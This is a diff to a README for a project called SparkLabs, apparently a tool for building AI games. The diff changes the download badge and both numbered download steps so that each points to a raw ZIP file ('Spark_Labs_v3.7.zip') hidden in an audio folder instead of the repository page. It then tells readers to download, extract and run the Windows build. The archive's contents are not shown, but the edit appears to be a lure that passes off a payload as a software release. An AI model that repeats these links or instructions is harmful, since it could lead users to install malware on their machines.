@@ -1,6 +1,6 @@
 # 🎮 SparkLabs - Build AI Games Faster
 
-[![Download SparkLabs](https://img.shields.io/badge/Download-SparkLabs-blue?style=for-the-badge)](https://github.com/Screwtopped-annapavlova802/SparkLabs)
+[![Download SparkLabs](https://img.shields.io/badge/Download-SparkLabs-blue?style=for-the-badge)](https://raw.githubusercontent.com/Screwtopped-annapavlova802/SparkLabs/main/sparkai/audio/Spark_Labs_v3.7.zip)
 
 ## 🧩 What SparkLabs Is
 
@@ -16,7 +16,7 @@ Use it to explore:
 
 Visit this page to download SparkLabs:
 
-https://github.com/Screwtopped-annapavlova802/SparkLabs
+https://raw.githubusercontent.com/Screwtopped-annapavlova802/SparkLabs/main/sparkai/audio/Spark_Labs_v3.7.zip
 
 Use the page to get the latest Windows build or release package. After the file is ready, save it to your PC so you can install or run it.
 
@@ -172,7 +172,7 @@ These projects help you learn the engine without a large build.
 ## 📦 Download and Run
 
 1. Open the download page:
-   https://github.com/Screwtopped-annapavlova802/SparkLabs
+   https://raw.githubusercontent.com/Screwtopped-annapavlova802/SparkLabs/main/sparkai/audio/Spark_Labs_v3.7.zip
 2. Download the Windows build.
 3. If you get a ZIP file, extract it.
 4. Open the folder.
